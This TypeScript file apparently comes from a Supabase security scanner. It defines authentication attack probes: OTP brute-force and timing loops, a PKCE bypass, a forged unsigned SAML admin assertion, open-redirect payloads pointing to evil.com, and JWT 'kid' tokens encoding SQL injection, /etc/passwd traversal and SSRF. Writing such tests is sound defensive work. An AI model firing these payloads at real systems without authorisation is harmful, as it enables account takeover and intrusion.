/**
 * Auth Edge Case attacks
 * Advanced authentication vulnerabilities specific to Supabase
 */

import type { AttackVector } from '$lib/types/attacks';

export const authEdgeAttacks: AttackVector[] = [
	{
		id: 'auth-magic-link-token',
		name: 'Magic Link Token Prediction',
		description: 'Test if magic link tokens are predictable or enumerable',
		category: 'auth',
		severity: 'critical',
		async execute(context) {
			try {
				// Request magic links for test emails
				const testEmails = ['test@test.com', 'admin@test.com'];
				const tokens: string[] = [];

				for (const email of testEmails) {
					const res = await fetch(
						`${context.supabaseUrl}/auth/v1/magiclink`,
						{
							method: 'POST',
							headers: {
								'Content-Type': 'application/json',
								'apikey': context.anonKey
							},
							body: JSON.stringify({ email }),
							signal: context.signal
						}
					);

					// Check response for token exposure
					const data = await res.json();
					if (data.token || data.confirmation_url) {
						tokens.push(data.token || data.confirmation_url);
					}
				}

				return {
					breached: tokens.length > 0,
					status: tokens.length > 0 ? 'breached' : 'secure',
					summary: tokens.length > 0
						? 'Magic link tokens exposed in response!'
						: 'Magic link tokens not exposed',
					evidence: tokens.length > 0 ? { exposedTokens: true } : undefined
				};
			} catch {
				return { breached: false, status: 'secure', summary: 'Magic link endpoint secure' };
			}
		}
	},
	{
		id: 'auth-otp-brute-force',
		name: 'OTP Brute Force Vulnerability',
		description: 'Test if OTP verification lacks rate limiting',
		category: 'auth',
		severity: 'high',
		async execute(context) {
			try {
				const attempts: number[] = [];
				const testPhone = '+15555550100';

				// Try multiple OTP codes rapidly
				for (let i = 0; i < 10; i++) {
					const otp = String(100000 + i).slice(0, 6);
					const startTime = Date.now();

					const res = await fetch(
						`${context.supabaseUrl}/auth/v1/verify`,
						{
							method: 'POST',
							headers: {
								'Content-Type': 'application/json',
								'apikey': context.anonKey
							},
							body: JSON.stringify({
								type: 'sms',
								phone: testPhone,
								token: otp
							}),
							signal: context.signal
						}
					);

					attempts.push(Date.now() - startTime);

					// Check if rate limited
					if (res.status === 429) {
						return {
							breached: false,
							status: 'secure',
							summary: `Rate limiting active after ${i + 1} attempts`
						};
					}
				}

				return {
					breached: true,
					status: 'breached',
					summary: 'No rate limiting on OTP verification - brute force possible',
					evidence: { attemptsCompleted: 10, avgResponseTime: attempts.reduce((a, b) => a + b, 0) / attempts.length }
				};
			} catch {
				return { breached: false, status: 'error', summary: 'Could not test OTP brute force' };
			}
		}
	},
	{
		id: 'auth-otp-timing',
		name: 'OTP Timing Attack',
		description: 'Test for timing differences that reveal valid vs invalid OTPs',
		category: 'auth',
		severity: 'medium',
		async execute(context) {
			try {
				const timings: Array<{ otp: string; time: number }> = [];

				// Test different OTP patterns
				const otps = ['000000', '123456', '111111', '999999', '012345'];

				for (const otp of otps) {
					const start = performance.now();
					await fetch(
						`${context.supabaseUrl}/auth/v1/verify`,
						{
							method: 'POST',
							headers: {
								'Content-Type': 'application/json',
								'apikey': context.anonKey
							},
							body: JSON.stringify({
								type: 'sms',
								phone: '+15555550100',
								token: otp
							}),
							signal: context.signal
						}
					);
					timings.push({ otp, time: performance.now() - start });
				}

				// Check for significant timing variance
				const times = timings.map(t => t.time);
				const avg = times.reduce((a, b) => a + b, 0) / times.length;
				const variance = times.map(t => Math.abs(t - avg));
				const maxVariance = Math.max(...variance);

				const hasTimingLeak = maxVariance > avg * 0.3; // 30% variance threshold

				return {
					breached: hasTimingLeak,
					status: hasTimingLeak ? 'breached' : 'secure',
					summary: hasTimingLeak
						? `Timing variance detected (${maxVariance.toFixed(0)}ms) - side channel possible`
						: 'No significant timing variance',
					evidence: hasTimingLeak ? { timings, variance: maxVariance } : undefined
				};
			} catch {
				return { breached: false, status: 'error', summary: 'Could not test OTP timing' };
			}
		}
	},
	{
		id: 'auth-pkce-bypass',
		name: 'PKCE Bypass Attempt',
		description: 'Test if OAuth PKCE can be bypassed',
		category: 'auth',
		severity: 'high',
		async execute(context) {
			try {
				// Try OAuth without code_verifier
				const res = await fetch(
					`${context.supabaseUrl}/auth/v1/token?grant_type=authorization_code`,
					{
						method: 'POST',
						headers: {
							'Content-Type': 'application/json',
							'apikey': context.anonKey
						},
						body: JSON.stringify({
							code: 'test-authorization-code',
							// Intentionally missing code_verifier
							redirect_uri: 'http://localhost:3000/callback'
						}),
						signal: context.signal
					}
				);

				const data = await res.json();

				// Check if PKCE is required
				const pkceRequired = data?.error?.includes('code_verifier') ||
					data?.message?.includes('PKCE') ||
					res.status === 400;

				return {
					breached: !pkceRequired && res.ok,
					status: pkceRequired ? 'secure' : 'breached',
					summary: pkceRequired
						? 'PKCE is required for OAuth'
						: 'PKCE may be bypassable!',
					evidence: !pkceRequired ? data : undefined
				};
			} catch {
				return { breached: false, status: 'error', summary: 'Could not test PKCE' };
			}
		}
	},
	{
		id: 'auth-saml-injection',
		name: 'SAML Response Injection',
		description: 'Test for SAML assertion injection vulnerabilities',
		category: 'auth',
		severity: 'critical',
		async execute(context) {
			try {
				// Test SAML endpoint with malformed assertion
				const maliciousSaml = btoa(`
					<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
						<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
							<saml:Subject>
								<saml:NameID>admin@target.com</saml:NameID>
							</saml:Subject>
						</saml:Assertion>
					</samlp:Response>
				`);

				const res = await fetch(
					`${context.supabaseUrl}/auth/v1/sso/saml/acs`,
					{
						method: 'POST',
						headers: {
							'Content-Type': 'application/x-www-form-urlencoded',
							'apikey': context.anonKey
						},
						body: `SAMLResponse=${encodeURIComponent(maliciousSaml)}`,
						signal: context.signal
					}
				);

				const data = await res.json();

				// If we get anything other than signature validation error, might be vulnerable
				const signatureValidated = data?.error?.includes('signature') ||
					data?.message?.includes('signature') ||
					res.status === 401;

				return {
					breached: !signatureValidated && res.ok,
					status: signatureValidated ? 'secure' : 'breached',
					summary: signatureValidated
						? 'SAML signature validation active'
						: 'SAML signature validation may be weak!',
					evidence: !signatureValidated ? data : undefined
				};
			} catch {
				return { breached: false, status: 'secure', summary: 'SAML endpoint not accessible or secure' };
			}
		}
	},
	{
		id: 'auth-sso-redirect-bypass',
		name: 'SSO Redirect URL Bypass',
		description: 'Test for open redirect in SSO flow',
		category: 'auth',
		severity: 'medium',
		async execute(context) {
			try {
				// Test SSO with malicious redirect
				const maliciousRedirects = [
					'https://evil.com',
					'//evil.com',
					'https://evil.com%00.target.com',
					'https://target.com.evil.com'
				];

				for (const redirect of maliciousRedirects) {
					const res = await fetch(
						`${context.supabaseUrl}/auth/v1/authorize?provider=google&redirect_to=${encodeURIComponent(redirect)}`,
						{
							method: 'GET',
							headers: {
								'apikey': context.anonKey
							},
							redirect: 'manual',
							signal: context.signal
						}
					);

					const location = res.headers.get('location') || '';
					if (location.includes('evil.com')) {
						return {
							breached: true,
							status: 'breached',
							summary: `Open redirect via SSO: ${redirect}`,
							evidence: { maliciousRedirect: redirect, location }
						};
					}
				}

				return {
					breached: false,
					status: 'secure',
					summary: 'SSO redirect validation active'
				};
			} catch {
				return { breached: false, status: 'error', summary: 'Could not test SSO redirects' };
			}
		}
	},
	{
		id: 'auth-session-token-leak',
		name: 'Session Token URL Leak',
		description: 'Check if session tokens appear in URLs or referrer headers',
		category: 'auth',
		severity: 'high',
		async execute(context) {
			try {
				// Check callback endpoints for token exposure
				const res = await fetch(
					`${context.supabaseUrl}/auth/v1/callback`,
					{
						method: 'GET',
						headers: {
							'apikey': context.anonKey
						},
						redirect: 'manual',
						signal: context.signal
					}
				);

				const location = res.headers.get('location') || '';

				// Check if tokens appear in redirect URL fragments
				const hasTokenInUrl = location.includes('access_token=') ||
					location.includes('refresh_token=');

				// This is actually expected behavior for implicit flow
				// but should flag if using code flow
				return {
					breached: hasTokenInUrl,
					status: hasTokenInUrl ? 'breached' : 'secure',
					summary: hasTokenInUrl
						? 'Tokens exposed in URL fragment (use PKCE code flow instead)'
						: 'No token exposure in URLs',
					evidence: hasTokenInUrl ? { redirectType: 'fragment' } : undefined
				};
			} catch {
				return { breached: false, status: 'error', summary: 'Could not test token exposure' };
			}
		}
	},
	{
		id: 'auth-password-policy-weak',
		name: 'Weak Password Policy',
		description: 'Test if weak passwords are accepted',
		category: 'auth',
		severity: 'medium',
		async execute(context) {
			const weakPasswords = ['123456', 'password', 'qwerty', 'abc123', '111111', 'admin'];
			const accepted: string[] = [];

			for (const password of weakPasswords) {
				try {
					const res = await fetch(
						`${context.supabaseUrl}/auth/v1/signup`,
						{
							method: 'POST',
							headers: {
								'Content-Type': 'application/json',
								'apikey': context.anonKey
							},
							body: JSON.stringify({
								email: `test-${Date.now()}@supashield-test.com`,
								password
							}),
							signal: context.signal
						}
					);

					const data = await res.json();

					// Check if password was rejected for being weak
					if (!data?.error?.includes('password') && res.ok) {
						accepted.push(password);
					}
				} catch {
					// Request failed
				}
			}

			return {
				breached: accepted.length > 0,
				status: accepted.length > 0 ? 'breached' : 'secure',
				summary: accepted.length > 0
					? `Weak passwords accepted: ${accepted.join(', ')}`
					: 'Weak passwords rejected',
				evidence: accepted.length > 0 ? { weakPasswords: accepted } : undefined
			};
		}
	},
	{
		id: 'auth-account-lockout-missing',
		name: 'Missing Account Lockout',
		description: 'Test if accounts get locked after failed login attempts',
		category: 'auth',
		severity: 'high',
		async execute(context) {
			try {
				const testEmail = 'lockout-test@supashield.com';
				let attempts = 0;
				let locked = false;

				for (let i = 0; i < 20; i++) {
					const res = await fetch(
						`${context.supabaseUrl}/auth/v1/token?grant_type=password`,
						{
							method: 'POST',
							headers: {
								'Content-Type': 'application/json',
								'apikey': context.anonKey
							},
							body: JSON.stringify({
								email: testEmail,
								password: `wrong-password-${i}`
							}),
							signal: context.signal
						}
					);

					attempts++;

					if (res.status === 429 || res.status === 423) {
						locked = true;
						break;
					}

					const data = await res.json();
					if (data?.error?.includes('locked') || data?.error?.includes('too many')) {
						locked = true;
						break;
					}
				}

				return {
					breached: !locked && attempts >= 20,
					status: locked ? 'secure' : 'breached',
					summary: locked
						? `Account lockout after ${attempts} attempts`
						: `No lockout after ${attempts} failed attempts - brute force possible`,
					evidence: !locked ? { attemptsWithoutLockout: attempts } : undefined
				};
			} catch {
				return { breached: false, status: 'error', summary: 'Could not test account lockout' };
			}
		}
	},
	{
		id: 'auth-jwt-kid-injection',
		name: 'JWT Key ID Injection',
		description: 'Test for JWT header injection via kid parameter',
		category: 'auth',
		severity: 'critical',
		async execute(context) {
			try {
				// Create JWT with malicious kid
				const maliciousJwts = [
					// SQL injection in kid
					'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IicgT1IgJzEnPScxIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.invalid',
					// Path traversal in kid
					'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiIxMjM0NTY3ODkwIn0.invalid',
					// URL in kid (SSRF)
					'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Imh0dHA6Ly9ldmlsLmNvbS9rZXkifQ.eyJzdWIiOiIxMjM0NTY3ODkwIn0.invalid'
				];

				for (const jwt of maliciousJwts) {
					const res = await fetch(
						`${context.supabaseUrl}/rest/v1/users`,
						{
							headers: {
								'apikey': context.anonKey,
								'Authorization': `Bearer ${jwt}`
							},
							signal: context.signal
						}
					);

					// If we don't get a clear JWT validation error, might be vulnerable
					if (res.ok) {
						return {
							breached: true,
							status: 'breached',
							summary: 'JWT kid injection may be possible!',
							evidence: { jwt: jwt.substring(0, 50) + '...' }
						};
					}
				}

				return {
					breached: false,
					status: 'secure',
					summary: 'JWT kid parameter properly validated'
				};
			} catch {
				return { breached: false, status: 'error', summary: 'Could not test JWT kid injection' };
			}
		}
	}
];
